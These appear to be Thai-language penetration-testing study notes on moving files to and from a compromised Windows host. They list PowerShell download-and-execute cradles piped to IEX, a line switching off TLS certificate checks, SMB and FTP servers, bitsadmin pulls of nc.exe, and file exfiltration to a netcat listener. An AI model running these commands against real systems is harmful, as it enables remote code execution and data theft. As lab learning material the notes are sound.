#Note Fileless 
```
(Windows)
PowerShell Base64 Encode & Decode
[IO.File]::WriteAllBytes(" <Path_with_FileName-to-save> ", [Convert]::FromBase64String(" <Base64_Encoded> "))
คำสั่งนี้ ทำการ decode base64 -> String แล้วเก็บลงใน path และชื่อไฟล์ที่กำหนด

-----------

Web Download
Basic Download
new-object net.webclient.downloadfileasync(' < Target > ', ' <Save-To-File-Name, Output> ')

---

เรียกใช้สคริปต์นั้นโดยตรงในหน่วยความจำโดยใช้ cmdlet Invoke-Expression หรือนามแฝง IEX
Fileless
iex new-object net.webclient.downloadstring(' <Target> ')
หรือ 
new-object net.webclient.downloadstring(' <URL Target file> ') | iex
มันจะโหลดแล้วรันเลย

---
PowerShell v.3 ใช้
Invoke-WebRequest <URL> -OutFile <Filename>.ps1
OR
iwr <URL> -OutputFile <Filename>
OR error  The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch 
configuration is not complete. Specify the UseBasicParsing parameter and try again.
> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

Or Error TLS/SSL : The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

=====================================

SMB File Transfer
อย่างแรก เราจะแชร์เป็น smb จากเครื่องของเราเองที่เราไม่ทำบนเครื่องเป้าหมายเพราะยังอัพไฟล์ขึ้นไปไม่ได้
รันบนเครื่องเรา
> sudo impacket-smbserver share -smb2support /tmp/smbshare
คำว่า share คือชื่อ path share
-smb2support คือรองรับ smb v2
/tmp/smbshare  คือ path จริงของ path share นี้ หรือก็คือ folder ที่เราเอาไฟล์ที่ต้องแชร์ให้เครื่องเป้าหมายเข้ามาโหลดไปได้

--
copy \\<IP เรา>\<ชื่อ <pathshare>\<ชื่อโปรแกรมที่ต้องการดึง>
แต่ถ้า
Error : You can't access this shared folder because your organization's security policies block unauthenticated guest access. 
These policies help protect your PC from unsafe or malicious devices on the network.
ในการถ่ายโอนไฟล์ในสถานการณ์นี้ เราสามารถตั้งชื่อผู้ใช้และรหัสผ่านโดยใช้เซิร์ฟเวอร์ Impacket SMB
> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
ตามนี้ user test
     pass test
วิธีใช้ก็
>  net use n: \\<IP เรา>\<ชื่อ <pathshare> /user:test test
-------------------------------------------

รูปแบบการโหลดข้อมูลโดย FTP
ขั้นแรก เราต้องรัน
> python -m pyftpdlib --port 21
เพื่อทำตัวเองเป็น ftp server
จากนั้นที่เครื่องเป้าหมาย
> (new-object net.webclient).downloadfile(' <URL เราที่เปิด ftp เช่น ftp://url/filename.txt > ', ' <ตำแหน่งที่เก็บไฟล์และชื่อไฟล์> ')
OR
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
=========================================================

ต่อมา การเข้ารหัส ถอดรหัส base64 ด้วย PowerShell
เบื้องต้น เราต้องเก็บ hashsum md5 ของไฟล์ที่เราสนใจก่อนส่งไฟล์ออกมา เพื่อคอนเฟริมว่าไฟล์ข้อมูลถูกต้องสมบูรณ์
ตอนแรกทำการเข้ารหัสให้เป็น Base64 เพื่อความสะดวก
> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

เช็ค hashsum md5
> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm md5 | select Hash
อันนี้คือผล hash จากต้นทาง
>
จากนั้น ยัด base64 encode ที่ได้เข้าไฟล์ที่ต้องการ เช่น
> echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNybo= | base64 -d > hosts
ในที่นี้เก็บลงไฟล์ host แบบ decode แล้ว
บน linux เช็ค md5sum ได้โดย
> md5sum hosts
-----------------------------------------------

ต่อไปการ upload ผ่าน powershell
ใช้ได้ทั้ง Invoke-WebRequest และ Invoke-RestMethod

--
ในที่นี้ เราจะใช้ python ทำเป็น server รับการ upload file
> python3 -m uploadserver
พารามิเตอร์ มีสองตัว
-File ซึ่งเราใช้เพื่อระบุเส้นทางของไฟล์ และ
-UriURL ของเซิร์ฟเวอร์ที่เราจะอัปโหลดไฟล์
> invoke-fileupload -uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-------

อีกแบบกรณีใช้ร่วมกับ netcat บนเครื่องเรา
> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
เก็บใน session ตัวแปร $b64
> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
ยิงผ่าน POST เข้ามาที่ nc ที่เราเปิดรอ

เครื่องเราเปิดรอเลย
> nc -lvnp 8000
เมื่อมีการยิง base64 เข้ามา เราก็ทำการ
> echo <base64> | base64 -d -w 0 > hosts
Decode base64 แล้วเก็บลงไฟล์ hosts
จบ
-------------

การเชื่อมต่อด้วย RDP ไปหา windows
xfreerdp3 /u:User /p:Password /v:Server

------------------------

แบบอื่น เช่น Bitsadmin
สามารถใช้เพื่อดาวน์โหลดไฟล์จากไซต์ HTTP และการแชร์ SMB
ดาวน์โหลดไฟล์ด้วย Bitsadmin
> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
> bitsadmin /transfer wcb /priority foreground < url source file > < Output file *ต้องใส่ path เต็ม >

หรือ
> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
> Import-Module bitstransfer; Start-BitsTransfer -Source " Url source file " -Destination " Output File *ต้องใส่ path เต็ม "

